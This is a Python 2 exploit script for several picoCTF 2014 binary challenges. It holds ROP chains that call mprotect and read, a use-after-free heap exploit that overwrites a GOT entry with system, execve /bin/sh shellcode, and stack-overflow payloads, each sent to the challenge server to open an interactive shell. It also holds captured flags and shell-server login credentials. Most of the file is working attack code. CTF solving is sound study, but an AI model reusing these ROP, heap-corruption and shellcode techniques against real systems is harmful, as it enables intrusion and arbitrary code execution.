__author__ = 'HuyNA'

import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
import sys
#from pexpect import spawn

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop
shellcode = read_file('run_bin_sh')
#beauty_print(shellcode)


def HardcoreROP():
    # nc vuln2014.picoctf.com 4000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vuln2014.picoctf.com', 4000))
    #s.connect(('192.168.248.129', 4544))
    base_heap = 0x0F000000


    '''
    socat TCP-LISTEN:4545,reuseaddr,fork EXEC:./task
    0x00009e4a: int 0x80 ; ret  ;
    0x00004feb: pop ebx ; ret  ;  (1 found)
    0x000028bb: pop eax ; ret  ;  (1 found)
    0x0000540b: pop ecx ; ret  ;  (1 found)
    0x00000b99: pop edx ; ret  ;  (1 found)
    0x00007e37: pop esi ; ret  ;  (1 found)
    0x00000ef3: pop edi ; ret
    125	sys_mprotect	unsigned long	size_t	unsigned long	-
    import gdb
import struct
import codecs

pattern1 = '\t0xcd\t0x80\t0xc3'
pattern2 = '\t0xfd\t0x63\t0xb5'

class CheckFmtBreakpoint(gdb.Breakpoint):
	def __init__(self, spec, base_address):
		super(CheckFmtBreakpoint, self).__init__(spec, gdb.BP_BREAKPOINT, internal=False)
		self.base_address = base_address
	def stop(self):
		global count
		count += 1
		address_assign_ip = self.base_address + 0x000004C2
		gdb.execute('set *(int*)($ebp-0x1c)='+str(count), True, True)
		gdb.execute('set $eip='+hex(address_assign_ip), True, True)
		a = gdb.execute('x/40960xb 0x0f000000', True, True)
		print(a[0:250])
		#print(type(a))
		#print(a.encode('ascii'))

		if pattern1 in a:
			print('count = '+str(count))
			print('FOUND ===============================================')
		else:
			gdb.execute('c ', False, False)
		return True

class GetBaseAddress(gdb.Breakpoint):
	def __init__(self, spec):
		super(GetBaseAddress, self).__init__(spec, gdb.BP_BREAKPOINT, internal=True)
	def stop(self):
		self.result1 = gdb.execute('vmmap', True, True)

		self.result1 = self.result1.split()
		address_base = int(self.result1[5][2:], 16)-0x2000
		#print(address_base)
		#print(hex(address_base))

		b_2 = address_base + 0x0004FD
		b_2 = '*'+hex(b_2)
		#print(b_2)
		CheckFmtBreakpoint(b_2, address_base)
		return True

# find base address
count = 0
gdb.execute('del', True, True)
GetBaseAddress('main')
gdb.execute('r .', False, False)

# Set breakpoints on all *printf functions

    '''
    pop_eax = 0x00000d25
    pop_ebx = 0x000010a4
    pop_ecx = 0x00001985
    pop_edx = 0x0000107f
    pop_esi = 0x00001f73
    pop_edi = 0x000020bd
    int_80_ret = 0x000030fa

    rop = [
        base_heap+pop_eax,   # eax = 0x7d => mprotect
        0x7d,
        base_heap+pop_ebx,   # ebx = 0xF000000
        0x0F000000,
        base_heap+pop_ecx,   # ecx = 0xA000
        0xA000,
        base_heap+pop_edx,   # edx = 0x7
        0x7,
        base_heap+pop_esi,
        0x00,
        base_heap+pop_edi,
        0x00,
        base_heap+int_80_ret,   # int 0x80 ; ret

        base_heap+pop_eax,   # eax = 0x3 => read
        0x3,
        base_heap+pop_ebx,   # ebx = 0 => stdin
        0x0,
        base_heap+pop_ecx,   # ecx = 0x0F000000  => buffer recv
        0x0F000000,
        base_heap+pop_edx,   # edx = 0x1000 => size recv
        0x1000,
        base_heap+int_80_ret,   # int 0x80 ; ret
        0x0F000000,     # return to shellcode
        0x0,
        0x0F000000,     # address recv shellcode
        0x1000          # size recv shellcode
    ]

    rop = convert_format(rop)
    print s.recv(1024)
    #recv_until(s, 'yo, what\'s up?')
    junk = 'a'*28+'b'*4
    buf = pi(30) + junk + rop

    #sys.stdin.read(1)

    s.send(buf+'\n')
    print s.recv(1024)

    time.sleep(0.01)

    s.send(shellcode+'\n')

    s.send('ls\n')
    s.send('ls\n')
    final_interact(s)
    print s.recv(2014)
    print s.recv(2014)
    print s.recv(2014)


    final_interact(s)

#HardcoreROP()
'''
hard_as_PIE_amirite?
b *(0xf7742000+0x000004C8)
b *(0xf7742000+0x00000561)
'''

def FancyCache():
    '''
    Margaret wrote a fancy in-memory cache server. For extra security, she made a custom string structure that keeps strings on the heap. However, it looks like she was a little sloppy with her mallocs and frees. Can you find and exploit a bug to get a shell?

You can connect to the server at vuln2014.picoctf.com:4548

The following exploit mitigations are enabled on the server:

ASLR: This means the stack, heap, and libc addresses are randomized. However, the locations of code and data inside the binary is not randomized.

NX: No memory is every simultaneously writable and executable. This means that you cannot just write shellcode somewhere and get the program to jump to it.

Here's the info (don't worry about the libc file for now): source code, binary, libc

P.S. We found a client for the server: client.py

    '''
    CACHE_GET = 0
    CACHE_SET = 1

    kNotFound = 0x0
    kFound = 0x1
    kCacheFull = 0x2

    def write_string(f, s):
        f.send(pi(len(s)))
        time.sleep(0.001)
        f.send(s)

    def read_string(f):
        size = ui(f.recv(4))
        time.sleep(0.001)
        return f.recv(size)

    def cache_get(f, key):
        time.sleep(0.001)
        f.send(chr(CACHE_GET))
        write_string(f, key)

        status = ord(f.recv(1))
        if status == kNotFound:
            print 'not found cache ... '
            return None
        assert status == kFound

        return read_string(f)

    def cache_set(f, key, value, lifetime):
        time.sleep(0.001)
        f.send(chr(CACHE_SET))
        write_string(f, key)

        status = ord(f.recv(1))
        if status == kCacheFull:
            print 'cache full ... '
            return False
        assert status == kFound

        write_string(f, value)
        f.send(pi(lifetime))
        return True

    # nc vuln2014.picoctf.com 4548
    # socat TCP-LISTEN:4548,reuseaddr,fork EXEC:./fancy_cache
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vuln2014.picoctf.com', 4548))
    #s.connect(('192.168.248.129', 4548))

    raw_input()
    print '[+] '
    cache_set(s, '/bin/sh\x00', '/bin/sh\x00', 0x42)
    address_to_write = 0x0804B080+0xC       # point to cache array
    spray_count = 5
    # create cache key1-value1-lifetime

    # set up heap 1 => spray ...
    value1 = pi(address_to_write)*3
    lifetime = 0x1
    for i in xrange(spray_count):
        key = str(i)+'\x00'*3+pi(address_to_write)*2
        cache_set(s, key, value1, lifetime)

    # get cache => free cache.value but not assign NULL
    for i in xrange(spray_count):
        key = str(i)+'\x00'*3+pi(address_to_write)*2
        cache_get(s, key)

    for i in xrange(spray_count*2):
        key = str(i)*2+'\x00'*2+pi(address_to_write)*2
        cache_get(s, key)

    # set up heap 2 => overflow freed chunk
    secret_string_address = 0x08048BC8   # secret string address
    malloc_string_address = 0x08048F4E  # point to 'malloc'
    realloc_string_address = 0x08048F55 # point to 'realloc'
    realloc_got_address = 0x0804B020   # dia chi free trong GOT => de ghi de
    memcmp_got_address = 0x0804B014
    got_address = 0x0804B00C

    fake_1 = pi(0x100)+pi(0x200)+pi(secret_string_address)    # dump secret string
    fake_2 = pi(0x10)+pi(0x20)+pi(got_address)              # dump got table
    fake_3 = pi(0x10)+pi(0x20)+pi(memcmp_got_address)    # over-write realloc function

    fake_11 = pi(6)+pi(0x20)+pi(malloc_string_address)    # malloc
    fake_21 = pi(5)+pi(0x20)+pi(realloc_string_address+2) # alloc
    fake_31 = pi(7)+pi(0x20)+pi(realloc_string_address)    # realloc

    lifetime2 = 0x41
    spray_count1 = 1
    for i in xrange(spray_count1):
        key = str(i)+'\x00'*3+pi(address_to_write)*2
        value2 = pi(0x0804B200+0xC*3)+pi(0x0804B200)+pi(0x41)
        value3 = pi(0x0804B200+0xC*4)+pi(0x0804B200+0xC)+pi(0x41)
        value4 = pi(0x0804B200+0xC*5)+pi(0x0804B200+0xC*2)+pi(0x41)
        value = value2+value3+value4 + '\x00'*(0x180-0xC-len(value2+value3+value4)) + fake_1+fake_2+fake_3+fake_11+fake_21+fake_31
        cache_set(s, key, value, lifetime2)


    # dump secret string
    data = cache_get(s, 'malloc')
    print data

    # dump got table
    data = cache_get(s, 'alloc')
    print data
    print data.encode('hex')

    # calculate system function address
    read_address = ui(data[0:4])
    read_offset = 0x000DB4B0
    libc_base_address = read_address - read_offset
    print 'libc address = ' + hex(libc_base_address)
    system_offset = 0x00040100
    system_address = libc_base_address + system_offset
    print 'system address = ' + hex(system_address)

    # overwrite realloc function
    cache_set(s, 'realloc', pi(system_address), lifetime2)

    # trigger realloc function => run system('/bin/sh')
    time.sleep(0.001)
    s.send(chr(CACHE_GET))
    write_string(s, '/bin/sh\x00')
    final_interact(s)
    s.send('ls\n')
    print s.recv(1024)
    final_interact(s)

#FancyCache()
'''
# that_wasnt_so_free_after_all
'''

def Nevernote():
    '''
    In light of the recent attacks on their machines, Daedalus Corp has implemented a buffer overflow detection library. Nevernote, a program made for Daedalus Corps employees to take notes, uses this library.
Can you bypass their protection and read the secret? The binary can be found at /home/nevernote/ on the shell server.

The source can be downloaded here -https://picoctf.com/problem-static/binary/Nevernote/source.zip
    '''


    fake_heap = '\x01'*4+pi(0x31)+'a'*0x28+'\x01'*4+pi(0x31)+'b'*0x28
    shellcode_run_execv = '\x90'*4+'\x31\xD2\x31\xF6\x31\xFF\x31\xC0\x31\xC9\xB0\x0B\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x51\x89\xE2\x53\x89\xE1\xCD\x80'
    shellcode_run_execv += '\x90'*4

    stack_address_return = 0xffffd65c   # can xac dinh vi tri luc return o ham overflow la xong!
                                        # dia chi nay la co dinh do stack base ko random
    address_ = 0x0804b820

    heap_header_size = 8
    fake_heap_address = 0x804c008       # dia chi nay phai co dinh
                                        # chung to heap o moi lan chay deu GIONG NHAU
    shellcode_part = shellcode_run_execv+'\x90'*(0x80-len(shellcode_run_execv))
    junk_part = 'c'*512+'/hom'+pi(fake_heap_address)+'d'*16
    return_address = address_ + len(junk_part) + 4 + 4
    buff = junk_part+pi(return_address)+pi(address_)+shellcode_part+'\n'+'ls -l\n'+'id\n'+fake_heap

    username = 'huyna\n'

    total_buf = username + 'a\n' + buff +'\n'

    print total_buf

'''
the_hairy_canary_fairy_is_still_very_wary

tai sao lai khong free duoc vung nho bat ki??? Trong khi may bai truoc free lung tun duoc nhi!!!
'''

def NoOverflow():
    '''
    This tries to prevent a buffer overflow by asking you how long your input is! Exploit it anyways! The binary can be found at /home/no_overflow/ on the shell server. The source can be found here.
    https://picoctf.com/problem-static/binary/NoOverflow/no_overflow.c

    Username: pico84023 Password: 8434c3 | ssh pico84023@shell2014.picoctf.com -p 22
    '''

def CrudeCrypt():
    '''
    Without proper maintainers, development of Truecrypt has stopped! CrudeCrypt has emerged as a notable alternative in the open source community. The author has promised it is 'secure' but we know better than that. Take a look at the code (https://picoctf.com/problem-static/binary/CrudeCrypt/crude_crypt.c) and read the contents of flag.txt from the server! The problem is at /home/crudecrypt/crude_crypt on the shell server.
    '''

    '''
        +    ./crude_crypt (encrypt|decrypt) (input path) (output path)
        + OVERFLOW O TRUONG HOSTNAME
    '''
    from Crypto.Cipher import AES

    current_folder = 'C:\\Users\\HuyNA\\Desktop\\Research\\FontKernelVuln\\ThamKhao\\pico\\crude_crypt\\'
    magic_header = 0xc0dec0de
    magic_header = struct.pack('<I',magic_header)
    beauty_print(magic_header)

    #host_name = 'shell'
    host_name = 'ubuntu'
    host_name = 'a'*0x2c+pi(0xffffd67c+0x4)+shellcode+'\x00'
    file_size = 0x20
    data = 'b'*(file_size)

    my_key = hashlib.md5('huyna\n').hexdigest()
    my_key = my_key.decode('hex')
    beauty_print(my_key)

    IV="AAAAAAAAAAAAAAAA"
    plain_data = magic_header + pi(file_size) + host_name + data

    def encrypt(data, key):
        c = AES.new(key, AES.MODE_CBC, IV)
        s = c.encrypt(data)
        return s

    def decrypt(data, key):
        c = AES.new(key, AES.MODE_CBC, IV)
        s = c.decrypt(data)
        return s
    def align_size(size):
        if (size%16) == 0:
            return size
        else:
            return size + (16 - size%16)

    block_size = align_size(len(plain_data))
    plain_data += '\x00'*(block_size-len(plain_data))
    print 'befor encrypt ...'
    beauty_print(plain_data)
    print 'after decrypt ...'
    enc_data = encrypt(plain_data, my_key)
    beauty_print(enc_data)
    print 'confirm ...'
    beauty_print(decrypt(enc_data, my_key))

    write_file(current_folder+'cc', enc_data)

    buf_encrypt = read_file(current_folder+'b')
    buf_plain = read_file('C:\\Users\\HuyNA\\Desktop\\Research\\FontKernelVuln\\ThamKhao\\pico\\crude_crypt\\a')
    print 'buffer encrypted'
    beauty_print(buf_encrypt)
    print 'buffer plain'
    beauty_print(buf_plain)

    beauty_print(decrypt(buf_encrypt, my_key))



CrudeCrypt()
'''
writing_software_is_hard
'''